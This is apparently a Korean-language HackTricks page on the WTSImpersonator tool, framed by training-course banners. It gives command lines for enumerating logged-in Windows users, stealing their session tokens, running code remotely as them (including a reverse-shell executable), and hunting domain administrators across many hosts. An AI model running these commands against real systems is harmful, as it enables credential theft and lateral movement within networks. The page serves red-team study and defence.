{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**WTS Impersonator** 도구는 **"\\pipe\LSM_API_service"** RPC 명명된 파이프를 이용하여 로그인한 사용자를 은밀하게 열거하고 그들의 토큰을 탈취하여 전통적인 토큰 가장 기법을 우회합니다. 이 접근 방식은 네트워크 내에서 원활한 측면 이동을 촉진합니다. 이 기법의 혁신은 **Omri Baso**에게 기인하며, 그의 작업은 [GitHub](https://github.com/OmriBaso/WTSImpersonator)에서 확인할 수 있습니다.

### 핵심 기능
이 도구는 일련의 API 호출을 통해 작동합니다:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 주요 모듈 및 사용법
- **사용자 열거**: 도구를 사용하여 로컬 및 원격 사용자 열거가 가능합니다. 각 시나리오에 대한 명령어 사용:
- 로컬:
```powershell
.\WTSImpersonator.exe -m enum
```
- 원격, IP 주소 또는 호스트 이름을 지정하여:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **명령 실행**: `exec` 및 `exec-remote` 모듈은 작동을 위해 **서비스** 컨텍스트가 필요합니다. 로컬 실행은 WTSImpersonator 실행 파일과 명령만 필요합니다:
- 로컬 명령 실행 예:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe를 사용하여 서비스 컨텍스트를 얻을 수 있습니다:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **원격 명령 실행**: PsExec.exe와 유사하게 원격으로 서비스를 생성하고 설치하여 적절한 권한으로 실행할 수 있게 합니다.
- 원격 실행 예:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **사용자 헌팅 모듈**: 여러 시스템에서 특정 사용자를 대상으로 하여 그들의 자격 증명으로 코드를 실행합니다. 이는 여러 시스템에서 로컬 관리자 권한을 가진 도메인 관리자를 타겟팅하는 데 특히 유용합니다.
- 사용 예:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
